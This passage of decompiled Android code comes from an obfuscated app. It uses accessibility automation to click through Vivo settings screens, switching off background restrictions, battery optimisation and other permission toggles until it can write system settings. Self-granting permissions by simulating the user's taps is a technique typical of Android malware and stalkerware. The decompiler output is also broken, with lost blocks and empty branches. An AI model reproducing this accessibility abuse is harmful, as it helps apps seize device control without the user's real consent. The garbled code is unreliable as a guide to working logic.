                i3 = i4;
                t60.m214704c5(c0371a82.f55141a2, str4 + str3 + " (滚动" + i3 + "次后)");
                return Boolean.FALSE;
            }
            i3 = vivoSteps$clickTextWithScroll$1.f54773a3;
            list = vivoSteps$clickTextWithScroll$1.f54772a2;
            str3 = vivoSteps$clickTextWithScroll$1.f54771a1;
            c0371a82 = vivoSteps$clickTextWithScroll$1.f54770a0;
            kg1.m213544f4(obj);
            if (i3 >= 0) {
                str4 = "[滚动点击] ❌ 未找到: ";
                t60.m214704c5(c0371a82.f55141a2, str4 + str3 + " (滚动" + i3 + "次后)");
                return Boolean.FALSE;
            }
            str5 = str3;
            list2 = list;
            i4 = i3;
            i5 = 0;
            dqtvuisjd dqtvuisjdVar2 = c0371a82.f55139a0;
            String str122 = c0371a82.f55141a2;
            rootInActiveWindow = dqtvuisjdVar2.getRootInActiveWindow();
            if (rootInActiveWindow != null) {
            }
        }
        vivoSteps$clickTextWithScroll$1.f54770a0 = c0371a8;
        vivoSteps$clickTextWithScroll$1.f54771a1 = str2;
        vivoSteps$clickTextWithScroll$1.f54772a2 = list;
        vivoSteps$clickTextWithScroll$1.f54773a3 = i3;
        vivoSteps$clickTextWithScroll$1.f54777a7 = 2;
        if (b81.m210571b1(300L, vivoSteps$clickTextWithScroll$1) != coroutineSingletons) {
            str3 = str2;
            c0371a82 = c0371a8;
            if (i3 >= 0) {
            }
        }
        return coroutineSingletons;
    }

    /* JADX WARN: Code restructure failed: missing block: B:44:0x00a5, code lost:
    
        r11 = r8.get(0);
     */
    /* JADX WARN: Code restructure failed: missing block: B:45:0x00af, code lost:
    
        if (r11.isChecked() != false) goto L47;
     */
    /* JADX WARN: Code restructure failed: missing block: B:46:0x00b1, code lost:
    
        r11 = p000.AbstractC0003a2.m24a5(r11);
        r6.m212424f2(r11.centerX(), r11.centerY());
     */
    /* JADX WARN: Code restructure failed: missing block: B:48:0x00c2, code lost:
    
        return java.lang.Boolean.TRUE;
     */
    /* JADX WARN: Removed duplicated region for block: B:20:0x0049  */
    /* JADX WARN: Removed duplicated region for block: B:57:0x00e0  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:21:0x004f -> B:56:0x00dd). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:50:0x00c5 -> B:56:0x00dd). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:54:0x00db -> B:55:0x00dc). Please report as a decompilation issue!!! */
    /* renamed from: b1 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212394b1(String str, ContinuationImpl continuationImpl) throws Throwable {
        VivoSteps$clickVivo29SwitchOrFallback$1 vivoSteps$clickVivo29SwitchOrFallback$1;
        C0371a8 c0371a8;
        String str2;
        int i;
        String string;
        AccessibilityNodeInfo parent;
        if (continuationImpl instanceof VivoSteps$clickVivo29SwitchOrFallback$1) {
            vivoSteps$clickVivo29SwitchOrFallback$1 = (VivoSteps$clickVivo29SwitchOrFallback$1) continuationImpl;
            int i2 = vivoSteps$clickVivo29SwitchOrFallback$1.f54783a5;
            if ((i2 & Integer.MIN_VALUE) != 0) {
                vivoSteps$clickVivo29SwitchOrFallback$1.f54783a5 = i2 - Integer.MIN_VALUE;
            } else {
                vivoSteps$clickVivo29SwitchOrFallback$1 = new VivoSteps$clickVivo29SwitchOrFallback$1(this, continuationImpl);
            }
        }
        Object obj = vivoSteps$clickVivo29SwitchOrFallback$1.f54781a3;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i3 = vivoSteps$clickVivo29SwitchOrFallback$1.f54783a5;
        if (i3 == 0) {
            kg1.m213544f4(obj);
            c0371a8 = this;
            str2 = str;
            i = 0;
            if (i >= 21) {
            }
            return coroutineSingletons;
        }
        if (i3 != 1) {
            if (i3 != 2) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            kg1.m213544f4(obj);
            return obj;
        }
        i = vivoSteps$clickVivo29SwitchOrFallback$1.f54780a2;
        String str3 = vivoSteps$clickVivo29SwitchOrFallback$1.f54779a1;
        c0371a8 = vivoSteps$clickVivo29SwitchOrFallback$1.f54778a0;
        kg1.m213544f4(obj);
        str2 = str3;
        i++;
        if (i >= 21) {
            t60.m214726f4(c0371a8.f55141a2, "[SDK<29] forbid_btn未找到，尝试通用开关查找");
            vivoSteps$clickVivo29SwitchOrFallback$1.f54778a0 = null;
            vivoSteps$clickVivo29SwitchOrFallback$1.f54779a1 = null;
            vivoSteps$clickVivo29SwitchOrFallback$1.f54783a5 = 2;
            Object objM212430f8 = c0371a8.m212430f8(5, str2, vivoSteps$clickVivo29SwitchOrFallback$1, true);
            if (objM212430f8 != coroutineSingletons) {
                return objM212430f8;
            }
        } else {
            AccessibilityNodeInfo rootInActiveWindow = c0371a8.f55139a0.getRootInActiveWindow();
            if (rootInActiveWindow != null) {
                for (AccessibilityNodeInfo accessibilityNodeInfo : rootInActiveWindow.findAccessibilityNodeInfosByText(str2)) {
                    CharSequence text = accessibilityNodeInfo.getText();
                    if (text != null && (string = text.toString()) != null && string.equals(str2) && accessibilityNodeInfo.isVisibleToUser()) {
                        AccessibilityNodeInfo parent2 = accessibilityNodeInfo.getParent();
                        AccessibilityNodeInfo parent3 = (parent2 == null || (parent = parent2.getParent()) == null) ? null : parent.getParent();
                        if (parent3 != null) {
                            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = parent3.findAccessibilityNodeInfosByViewId("com.vivo.abe:id/forbid_btn");
                            t60.m214694b5(listFindAccessibilityNodeInfosByViewId, "switchNodes");
                            if (!listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                                break;
                            }
                        } else {
                            continue;
                        }
                    }
                }
                if (i < 20) {
                    c0371a8.m212425f3(true);
                    vivoSteps$clickVivo29SwitchOrFallback$1.f54778a0 = c0371a8;
                    vivoSteps$clickVivo29SwitchOrFallback$1.f54779a1 = str2;
                    vivoSteps$clickVivo29SwitchOrFallback$1.f54780a2 = i;
                    vivoSteps$clickVivo29SwitchOrFallback$1.f54783a5 = 1;
                    if (b81.m210571b1(500L, vivoSteps$clickVivo29SwitchOrFallback$1) != coroutineSingletons) {
                        str3 = str2;
                        str2 = str3;
                    }
                }
            }
            i++;
            if (i >= 21) {
            }
        }
        return coroutineSingletons;
    }

    /* JADX WARN: Code restructure failed: missing block: B:188:0x0568, code lost:
    
        if (r0 == r3) goto L199;
     */
    /* JADX WARN: Removed duplicated region for block: B:108:0x03b8  */
    /* JADX WARN: Removed duplicated region for block: B:112:0x03ce  */
    /* JADX WARN: Removed duplicated region for block: B:115:0x03d8  */
    /* JADX WARN: Removed duplicated region for block: B:118:0x03e2  */
    /* JADX WARN: Removed duplicated region for block: B:119:0x03e5  */
    /* JADX WARN: Removed duplicated region for block: B:122:0x0403  */
    /* JADX WARN: Removed duplicated region for block: B:123:0x0405  */
    /* JADX WARN: Removed duplicated region for block: B:126:0x040b  */
    /* JADX WARN: Removed duplicated region for block: B:138:0x0449  */
    /* JADX WARN: Removed duplicated region for block: B:141:0x0453  */
    /* JADX WARN: Removed duplicated region for block: B:142:0x0456  */
    /* JADX WARN: Removed duplicated region for block: B:145:0x0474  */
    /* JADX WARN: Removed duplicated region for block: B:146:0x0476  */
    /* JADX WARN: Removed duplicated region for block: B:149:0x047c  */
    /* JADX WARN: Removed duplicated region for block: B:152:0x049e  */
    /* JADX WARN: Removed duplicated region for block: B:155:0x04a9  */
    /* JADX WARN: Removed duplicated region for block: B:159:0x04c6 A[PHI: r0 r4 r8 r12 r13 r15 r16 r17 r18
      0x04c6: PHI (r0v108 java.lang.Object) = (r0v107 java.lang.Object), (r0v1 java.lang.Object) binds: [B:157:0x04c2, B:21:0x009b] A[DONT_GENERATE, DONT_INLINE]
      0x04c6: PHI (r4v45 int) = (r4v42 int), (r4v48 int) binds: [B:157:0x04c2, B:21:0x009b] A[DONT_GENERATE, DONT_INLINE]
      0x04c6: PHI (r8v13 long) = (r8v11 long), (r8v14 long) binds: [B:157:0x04c2, B:21:0x009b] A[DONT_GENERATE, DONT_INLINE]
      0x04c6: PHI (r12v12 java.lang.String) = (r12v10 java.lang.String), (r12v13 java.lang.String) binds: [B:157:0x04c2, B:21:0x009b] A[DONT_GENERATE, DONT_INLINE]
      0x04c6: PHI (r13v4 com.storm.safe.rock.service.modules.yw5xud.a8) = (r13v2 com.storm.safe.rock.service.modules.yw5xud.a8), (r13v5 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:157:0x04c2, B:21:0x009b] A[DONT_GENERATE, DONT_INLINE]
      0x04c6: PHI (r15v14 java.lang.String) = (r15v12 java.lang.String), (r15v15 java.lang.String) binds: [B:157:0x04c2, B:21:0x009b] A[DONT_GENERATE, DONT_INLINE]
      0x04c6: PHI (r16v27 java.lang.String) = (r16v25 java.lang.String), (r16v28 java.lang.String) binds: [B:157:0x04c2, B:21:0x009b] A[DONT_GENERATE, DONT_INLINE]
      0x04c6: PHI (r17v26 java.lang.String) = (r17v24 java.lang.String), (r17v27 java.lang.String) binds: [B:157:0x04c2, B:21:0x009b] A[DONT_GENERATE, DONT_INLINE]
      0x04c6: PHI (r18v14 java.lang.String) = (r18v12 java.lang.String), (r18v15 java.lang.String) binds: [B:157:0x04c2, B:21:0x009b] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:161:0x04ce  */
    /* JADX WARN: Removed duplicated region for block: B:165:0x04eb A[PHI: r0 r4 r8 r12 r13 r15 r16 r17 r18
      0x04eb: PHI (r0v113 java.lang.Object) = (r0v112 java.lang.Object), (r0v1 java.lang.Object) binds: [B:163:0x04e7, B:20:0x0087] A[DONT_GENERATE, DONT_INLINE]
      0x04eb: PHI (r4v49 int) = (r4v46 int), (r4v52 int) binds: [B:163:0x04e7, B:20:0x0087] A[DONT_GENERATE, DONT_INLINE]
      0x04eb: PHI (r8v15 long) = (r8v13 long), (r8v16 long) binds: [B:163:0x04e7, B:20:0x0087] A[DONT_GENERATE, DONT_INLINE]
      0x04eb: PHI (r12v14 java.lang.String) = (r12v12 java.lang.String), (r12v15 java.lang.String) binds: [B:163:0x04e7, B:20:0x0087] A[DONT_GENERATE, DONT_INLINE]
      0x04eb: PHI (r13v6 com.storm.safe.rock.service.modules.yw5xud.a8) = (r13v4 com.storm.safe.rock.service.modules.yw5xud.a8), (r13v7 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:163:0x04e7, B:20:0x0087] A[DONT_GENERATE, DONT_INLINE]
      0x04eb: PHI (r15v16 java.lang.String) = (r15v14 java.lang.String), (r15v17 java.lang.String) binds: [B:163:0x04e7, B:20:0x0087] A[DONT_GENERATE, DONT_INLINE]
      0x04eb: PHI (r16v29 java.lang.String) = (r16v27 java.lang.String), (r16v30 java.lang.String) binds: [B:163:0x04e7, B:20:0x0087] A[DONT_GENERATE, DONT_INLINE]
      0x04eb: PHI (r17v28 java.lang.String) = (r17v26 java.lang.String), (r17v29 java.lang.String) binds: [B:163:0x04e7, B:20:0x0087] A[DONT_GENERATE, DONT_INLINE]
      0x04eb: PHI (r18v16 java.lang.String) = (r18v14 java.lang.String), (r18v17 java.lang.String) binds: [B:163:0x04e7, B:20:0x0087] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:167:0x04f3  */
    /* JADX WARN: Removed duplicated region for block: B:171:0x0510 A[PHI: r0 r4 r8 r12 r13 r15 r16 r17 r18
      0x0510: PHI (r0v118 java.lang.Object) = (r0v117 java.lang.Object), (r0v1 java.lang.Object) binds: [B:169:0x050c, B:19:0x0073] A[DONT_GENERATE, DONT_INLINE]
      0x0510: PHI (r4v53 int) = (r4v50 int), (r4v56 int) binds: [B:169:0x050c, B:19:0x0073] A[DONT_GENERATE, DONT_INLINE]
      0x0510: PHI (r8v17 long) = (r8v15 long), (r8v18 long) binds: [B:169:0x050c, B:19:0x0073] A[DONT_GENERATE, DONT_INLINE]
      0x0510: PHI (r12v16 java.lang.String) = (r12v14 java.lang.String), (r12v17 java.lang.String) binds: [B:169:0x050c, B:19:0x0073] A[DONT_GENERATE, DONT_INLINE]
      0x0510: PHI (r13v8 com.storm.safe.rock.service.modules.yw5xud.a8) = (r13v6 com.storm.safe.rock.service.modules.yw5xud.a8), (r13v9 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:169:0x050c, B:19:0x0073] A[DONT_GENERATE, DONT_INLINE]
      0x0510: PHI (r15v18 java.lang.String) = (r15v16 java.lang.String), (r15v19 java.lang.String) binds: [B:169:0x050c, B:19:0x0073] A[DONT_GENERATE, DONT_INLINE]
      0x0510: PHI (r16v31 java.lang.String) = (r16v29 java.lang.String), (r16v32 java.lang.String) binds: [B:169:0x050c, B:19:0x0073] A[DONT_GENERATE, DONT_INLINE]
      0x0510: PHI (r17v30 java.lang.String) = (r17v28 java.lang.String), (r17v31 java.lang.String) binds: [B:169:0x050c, B:19:0x0073] A[DONT_GENERATE, DONT_INLINE]
      0x0510: PHI (r18v18 java.lang.String) = (r18v16 java.lang.String), (r18v19 java.lang.String) binds: [B:169:0x050c, B:19:0x0073] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:173:0x0518  */
    /* JADX WARN: Removed duplicated region for block: B:177:0x0535  */
    /* JADX WARN: Removed duplicated region for block: B:180:0x053f  */
    /* JADX WARN: Removed duplicated region for block: B:183:0x0544  */
    /* JADX WARN: Removed duplicated region for block: B:184:0x0547  */
    /* JADX WARN: Removed duplicated region for block: B:187:0x055a  */
    /* JADX WARN: Removed duplicated region for block: B:194:0x0580 A[PHI: r4 r7 r9 r15 r18
      0x0580: PHI (r4v61 int) = (r4v58 int), (r4v64 int), (r4v64 int) binds: [B:186:0x0558, B:193:0x0579, B:192:0x0573] A[DONT_GENERATE, DONT_INLINE]
      0x0580: PHI (r7v14 long) = (r7v12 long), (r7v15 long), (r7v15 long) binds: [B:186:0x0558, B:193:0x0579, B:192:0x0573] A[DONT_GENERATE, DONT_INLINE]
      0x0580: PHI (r9v19 com.storm.safe.rock.service.modules.yw5xud.a8) = 
      (r9v17 com.storm.safe.rock.service.modules.yw5xud.a8)
      (r9v20 com.storm.safe.rock.service.modules.yw5xud.a8)
      (r9v20 com.storm.safe.rock.service.modules.yw5xud.a8)
     binds: [B:186:0x0558, B:193:0x0579, B:192:0x0573] A[DONT_GENERATE, DONT_INLINE]
      0x0580: PHI (r15v22 java.lang.String) = (r15v20 java.lang.String), (r15v23 java.lang.String), (r15v23 java.lang.String) binds: [B:186:0x0558, B:193:0x0579, B:192:0x0573] A[DONT_GENERATE, DONT_INLINE]
      0x0580: PHI (r18v22 java.lang.String) = (r18v20 java.lang.String), (r18v23 java.lang.String), (r18v23 java.lang.String) binds: [B:186:0x0558, B:193:0x0579, B:192:0x0573] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:197:0x0594 A[Catch: Exception -> 0x05ba, TRY_LEAVE, TryCatch #1 {Exception -> 0x05ba, blocks: (B:195:0x0589, B:197:0x0594, B:207:0x05bf), top: B:222:0x0589 }] */
    /* JADX WARN: Removed duplicated region for block: B:207:0x05bf A[Catch: Exception -> 0x05ba, TRY_ENTER, TRY_LEAVE, TryCatch #1 {Exception -> 0x05ba, blocks: (B:195:0x0589, B:197:0x0594, B:207:0x05bf), top: B:222:0x0589 }] */
    /* JADX WARN: Removed duplicated region for block: B:212:0x063f  */
    /* JADX WARN: Removed duplicated region for block: B:213:0x0642  */
    /* JADX WARN: Removed duplicated region for block: B:216:0x0654  */
    /* JADX WARN: Removed duplicated region for block: B:217:0x0656  */
    /* JADX WARN: Removed duplicated region for block: B:28:0x011b A[PHI: r0 r4 r5 r8 r10 r16 r17 r26
      0x011b: PHI (r0v70 java.lang.Object) = (r0v69 java.lang.Object), (r0v1 java.lang.Object) binds: [B:76:0x0326, B:27:0x010a] A[DONT_GENERATE, DONT_INLINE]
      0x011b: PHI (r4v26 int) = (r4v23 int), (r4v28 int) binds: [B:76:0x0326, B:27:0x010a] A[DONT_GENERATE, DONT_INLINE]
      0x011b: PHI (r5v4 java.lang.String) = (r5v2 java.lang.String), (r5v5 java.lang.String) binds: [B:76:0x0326, B:27:0x010a] A[DONT_GENERATE, DONT_INLINE]
      0x011b: PHI (r8v8 long) = (r8v6 long), (r8v9 long) binds: [B:76:0x0326, B:27:0x010a] A[DONT_GENERATE, DONT_INLINE]
      0x011b: PHI (r10v14 com.storm.safe.rock.service.modules.yw5xud.a8) = (r10v12 com.storm.safe.rock.service.modules.yw5xud.a8), (r10v15 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:76:0x0326, B:27:0x010a] A[DONT_GENERATE, DONT_INLINE]
      0x011b: PHI (r16v15 java.lang.String) = (r16v13 java.lang.String), (r16v16 java.lang.String) binds: [B:76:0x0326, B:27:0x010a] A[DONT_GENERATE, DONT_INLINE]
      0x011b: PHI (r17v14 java.lang.String) = (r17v12 java.lang.String), (r17v15 java.lang.String) binds: [B:76:0x0326, B:27:0x010a] A[DONT_GENERATE, DONT_INLINE]
      0x011b: PHI (r26v14 java.lang.String) = (r26v12 java.lang.String), (r26v15 java.lang.String) binds: [B:76:0x0326, B:27:0x010a] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:45:0x024d  */
    /* JADX WARN: Removed duplicated region for block: B:46:0x0255  */
    /* JADX WARN: Removed duplicated region for block: B:51:0x027d  */
    /* JADX WARN: Removed duplicated region for block: B:57:0x02a8  */
    /* JADX WARN: Removed duplicated region for block: B:58:0x02b0  */
    /* JADX WARN: Removed duplicated region for block: B:60:0x02b9 A[PHI: r0 r1 r4 r6 r7 r10 r11 r14 r15 r16 r17 r18 r26
      0x02b9: PHI (r0v28 com.storm.safe.rock.service.modules.yw5xud.a8) = (r0v13 com.storm.safe.rock.service.modules.yw5xud.a8), (r0v35 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:50:0x027b, B:59:0x02b5] A[DONT_GENERATE, DONT_INLINE]
      0x02b9: PHI (r1v5 java.lang.String) = (r1v2 java.lang.String), (r1v8 java.lang.String) binds: [B:50:0x027b, B:59:0x02b5] A[DONT_GENERATE, DONT_INLINE]
      0x02b9: PHI (r4v12 java.lang.String) = (r4v7 java.lang.String), (r4v15 java.lang.String) binds: [B:50:0x027b, B:59:0x02b5] A[DONT_GENERATE, DONT_INLINE]
      0x02b9: PHI (r6v7 java.lang.String) = (r6v3 java.lang.String), (r6v9 java.lang.String) binds: [B:50:0x027b, B:59:0x02b5] A[DONT_GENERATE, DONT_INLINE]
      0x02b9: PHI (r7v5 int) = (r7v2 int), (r7v7 int) binds: [B:50:0x027b, B:59:0x02b5] A[DONT_GENERATE, DONT_INLINE]
      0x02b9: PHI (r10v7 java.lang.String) = (r10v5 java.lang.String), (r10v8 java.lang.String) binds: [B:50:0x027b, B:59:0x02b5] A[DONT_GENERATE, DONT_INLINE]
      0x02b9: PHI (r11v4 long) = (r11v2 long), (r11v6 long) binds: [B:50:0x027b, B:59:0x02b5] A[DONT_GENERATE, DONT_INLINE]
      0x02b9: PHI (r14v5 int) = (r14v2 int), (r14v7 int) binds: [B:50:0x027b, B:59:0x02b5] A[DONT_GENERATE, DONT_INLINE]
      0x02b9: PHI (r15v7 java.lang.String) = (r15v3 java.lang.String), (r15v8 java.lang.String) binds: [B:50:0x027b, B:59:0x02b5] A[DONT_GENERATE, DONT_INLINE]
      0x02b9: PHI (r16v6 java.lang.String) = (r16v2 java.lang.String), (r16v7 java.lang.String) binds: [B:50:0x027b, B:59:0x02b5] A[DONT_GENERATE, DONT_INLINE]
      0x02b9: PHI (r17v5 java.lang.String) = (r17v1 java.lang.String), (r17v6 java.lang.String) binds: [B:50:0x027b, B:59:0x02b5] A[DONT_GENERATE, DONT_INLINE]
      0x02b9: PHI (r18v5 java.lang.String) = (r18v1 java.lang.String), (r18v6 java.lang.String) binds: [B:50:0x027b, B:59:0x02b5] A[DONT_GENERATE, DONT_INLINE]
      0x02b9: PHI (r26v5 java.lang.String) = (r26v2 java.lang.String), (r26v6 java.lang.String) binds: [B:50:0x027b, B:59:0x02b5] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:63:0x02db  */
    /* JADX WARN: Removed duplicated region for block: B:74:0x0316  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* JADX WARN: Removed duplicated region for block: B:80:0x0332  */
    /* JADX WARN: Removed duplicated region for block: B:84:0x0347  */
    /* JADX WARN: Removed duplicated region for block: B:87:0x0351  */
    /* JADX WARN: Removed duplicated region for block: B:90:0x035b  */
    /* JADX WARN: Removed duplicated region for block: B:91:0x035e  */
    /* JADX WARN: Removed duplicated region for block: B:94:0x037e  */
    /* JADX WARN: Removed duplicated region for block: B:95:0x0380  */
    /* JADX WARN: Removed duplicated region for block: B:98:0x0386  */
    /* renamed from: b3 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212395b3(String str, ContinuationImpl continuationImpl) {
        VivoSteps$execute$1 vivoSteps$execute$1;
        String strM212384e2;
        String str2;
        int i;
        String str3;
        String str4;
        String str5;
        String str6;
        String str7;
        String str8;
        C0371a8 c0371a8;
        String str9;
        int i2;
        String str10;
        long j;
        String str11;
        long j2;
        String str12;
        Object obj;
        C0371a8 c0371a82;
        C0371a8 c0371a83;
        Object obj2;
        String str13;
        String str14;
        C0371a8 c0371a84;
        String str15;
        int i3;
        String str16;
        String str17;
        int i4;
        long j3;
        C0371a8 c0371a85;
        String str18;
        long j4;
        int i5;
        long j5;
        C0371a8 c0371a86;
        int i6;
        long j6;
        String str19;
        C0371a8 c0371a87;
        long j7;
        long j8;
        int i7;
        C0371a8 c0371a88;
        int i8;
        C0371a8 c0371a89;
        long j9;
        C0371a8 c0371a810;
        Context context;
        int i9;
        long j10;
        C0371a8 c0371a811;
        Intent intentM211757a1;
        if (continuationImpl instanceof VivoSteps$execute$1) {
            vivoSteps$execute$1 = (VivoSteps$execute$1) continuationImpl;
            int i10 = vivoSteps$execute$1.f54794b0;
            if ((i10 & Integer.MIN_VALUE) != 0) {
                vivoSteps$execute$1.f54794b0 = i10 - Integer.MIN_VALUE;
            } else {
                vivoSteps$execute$1 = new VivoSteps$execute$1(this, continuationImpl);
            }
        }
        Object objM212406c4 = vivoSteps$execute$1.f54792a8;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i11 = vivoSteps$execute$1.f54794b0;
        VivoSteps$FlowType vivoSteps$FlowType = VivoSteps$FlowType.CLEAR_RECENT_TASKS;
        VivoSteps$FlowType vivoSteps$FlowType2 = VivoSteps$FlowType.BATTERY_OPTIMIZATION;
        VivoSteps$FlowType vivoSteps$FlowType3 = VivoSteps$FlowType.BASIC_PERMISSIONS;
        String str20 = "ms";
        switch (i11) {
            case 0:
                kg1.m213544f4(objM212406c4);
                long jCurrentTimeMillis = System.currentTimeMillis();
                String str21 = this.f55141a2;
                t60.m214704c5(str21, "🚀 [Vivo] 开始执行授权流程");
                if (Settings.System.canWrite(this.f55140a1)) {
                    t60.m214704c5(str21, "╔════════════════════════════════════════════════════════════");
                    t60.m214704c5(str21, "║ Vivo 授权流程 - 已完成（检测到系统设置权限）");
                    t60.m214704c5(str21, "║ ✅ Settings.System.canWrite = true");
                    t60.m214704c5(str21, "║ ⏭️ 跳过整个适配流程");
                    t60.m214704c5(str21, "╚════════════════════════════════════════════════════════════");
                    return Boolean.TRUE;
                }
                String strM212384e22 = m212384e2("ro.vivo.os.version");
                strM212384e2 = m212384e2("ro.vivo.os.build.display.id");
                str2 = "⚠️部分失败";
                i = Build.VERSION.SDK_INT;
                str3 = "✅全部成功";
                str4 = Build.MODEL;
                str5 = "╚════════════════════════════════════════════════════════════";
                if (this.f55142a3.m214991a6(vivoSteps$FlowType3)) {
                    str6 = str;
                    str7 = "ms";
                    str8 = strM212384e22;
                    c0371a8 = this;
                    str9 = str4;
                    i2 = 1;
                    str10 = "╔════════════════════════════════════════════════════════════";
                    j = jCurrentTimeMillis;
                    if (c0371a8.f55142a3.m214991a6(vivoSteps$FlowType2)) {
                    }
                    return coroutineSingletons;
                }
                vivoSteps$execute$1.f54784a0 = this;
                vivoSteps$execute$1.f54785a1 = str;
                vivoSteps$execute$1.f54786a2 = strM212384e22;
                vivoSteps$execute$1.f54787a3 = strM212384e2;
                vivoSteps$execute$1.f54788a4 = str4;
                vivoSteps$execute$1.f54789a5 = jCurrentTimeMillis;
                vivoSteps$execute$1.f54790a6 = i;
                str11 = strM212384e2;
                vivoSteps$execute$1.f54791a7 = 1;
                vivoSteps$execute$1.f54794b0 = 1;
                Object objM212397b5 = m212397b5(vivoSteps$execute$1);
                if (objM212397b5 != coroutineSingletons) {
                    j2 = jCurrentTimeMillis;
                    str12 = str;
                    i2 = 1;
                    str8 = strM212384e22;
                    obj = objM212397b5;
                    c0371a82 = this;
                    if (((Boolean) obj).booleanValue()) {
                        t60.m214726f4(c0371a82.f55141a2, "[Vivo] ⚠️ 基础权限流程失败，继续执行其他流程");
                    } else {
                        c0371a82.f55142a3.m214997b2(vivoSteps$FlowType3);
                    }
                    c0371a8 = c0371a82;
                    str7 = "ms";
                    str9 = str4;
                    str6 = str12;
                    str10 = "╔════════════════════════════════════════════════════════════";
                    j = j2;
                    strM212384e2 = str11;
                    if (c0371a8.f55142a3.m214991a6(vivoSteps$FlowType2)) {
                        int i12 = i;
                        vivoSteps$execute$1.f54784a0 = c0371a8;
                        vivoSteps$execute$1.f54785a1 = str6;
                        vivoSteps$execute$1.f54786a2 = str8;
                        vivoSteps$execute$1.f54787a3 = strM212384e2;
                        vivoSteps$execute$1.f54788a4 = str9;
                        vivoSteps$execute$1.f54789a5 = j;
                        vivoSteps$execute$1.f54790a6 = i12;
                        vivoSteps$execute$1.f54791a7 = i2;
                        vivoSteps$execute$1.f54794b0 = 3;
                        c0371a84 = c0371a8;
                        String str22 = str9;
                        String str23 = strM212384e2;
                        if (b81.m210571b1(500L, vivoSteps$execute$1) != coroutineSingletons) {
                        }
                    } else {
                        vivoSteps$execute$1.f54784a0 = c0371a8;
                        vivoSteps$execute$1.f54785a1 = str6;
                        vivoSteps$execute$1.f54786a2 = str8;
                        vivoSteps$execute$1.f54787a3 = strM212384e2;
                        vivoSteps$execute$1.f54788a4 = str9;
                        vivoSteps$execute$1.f54789a5 = j;
                        vivoSteps$execute$1.f54790a6 = i;
                        vivoSteps$execute$1.f54791a7 = i2;
                        vivoSteps$execute$1.f54794b0 = 2;
                        Object objM212401b9 = c0371a8.m212401b9(str6, vivoSteps$execute$1);
                        if (objM212401b9 != coroutineSingletons) {
                            String str24 = str9;
                            c0371a83 = c0371a8;
                            obj2 = objM212401b9;
                            str13 = str24;
                            str14 = str6;
                            if (((Boolean) obj2).booleanValue()) {
                                t60.m214726f4(c0371a83.f55141a2, "[Vivo] ⚠️ 电池优化流程失败，继续执行其他流程");
                            } else {
                                c0371a83.f55142a3.m214997b2(vivoSteps$FlowType2);
                            }
                            c0371a8 = c0371a83;
                            str9 = str13;
                            str6 = str14;
                            int i122 = i;
                            vivoSteps$execute$1.f54784a0 = c0371a8;
                            vivoSteps$execute$1.f54785a1 = str6;
                            vivoSteps$execute$1.f54786a2 = str8;
                            vivoSteps$execute$1.f54787a3 = strM212384e2;
                            vivoSteps$execute$1.f54788a4 = str9;
                            vivoSteps$execute$1.f54789a5 = j;
                            vivoSteps$execute$1.f54790a6 = i122;
                            vivoSteps$execute$1.f54791a7 = i2;
                            vivoSteps$execute$1.f54794b0 = 3;
                            c0371a84 = c0371a8;
                            String str222 = str9;
                            String str232 = strM212384e2;
                            if (b81.m210571b1(500L, vivoSteps$execute$1) != coroutineSingletons) {
                                str15 = str8;
                                i3 = i2;
                                str16 = str222;
                                str17 = str232;
                                long j11 = j;
                                i4 = i122;
                                j3 = j11;
                                if (i4 <= 33 || !AbstractC0779a1.m213656a9(str16, "V2001A")) {
                                    str20 = str7;
                                    if (i4 != 29 && AbstractC0779a1.m213656a9(str16, "V1962A")) {
                                        vivoSteps$execute$1.f54784a0 = c0371a84;
                                        vivoSteps$execute$1.f54785a1 = str6;
                                        vivoSteps$execute$1.f54786a2 = null;
                                        vivoSteps$execute$1.f54787a3 = null;
                                        vivoSteps$execute$1.f54788a4 = null;
                                        vivoSteps$execute$1.f54789a5 = j3;
                                        vivoSteps$execute$1.f54790a6 = i3;
                                        vivoSteps$execute$1.f54794b0 = 7;
                                        objM212406c4 = c0371a84.m212404c2(str6, vivoSteps$execute$1);
                                        if (objM212406c4 != coroutineSingletons) {
                                            i6 = i3;
                                            j6 = j3;
                                            if (!((Boolean) objM212406c4).booleanValue()) {
                                                i6 = 0;
                                            }
                                            vivoSteps$execute$1.f54784a0 = c0371a84;
                                            vivoSteps$execute$1.f54785a1 = null;
                                            vivoSteps$execute$1.f54789a5 = j6;
                                            vivoSteps$execute$1.f54790a6 = i6;
                                            vivoSteps$execute$1.f54794b0 = 8;
                                            objM212406c4 = c0371a84.m212403c1(str6, vivoSteps$execute$1);
                                            if (objM212406c4 != coroutineSingletons) {
                                                i8 = i6;
                                                c0371a89 = c0371a84;
                                                if (!((Boolean) objM212406c4).booleanValue()) {
                                                    i8 = 0;
                                                }
                                                long jCurrentTimeMillis2 = System.currentTimeMillis() - j6;
                                                t60.m214704c5(c0371a89.f55141a2, "[Vivo] V1962A特殊流程完成: " + (i8 == 0 ? str3 : str2) + ", 耗时: " + jCurrentTimeMillis2 + str20);
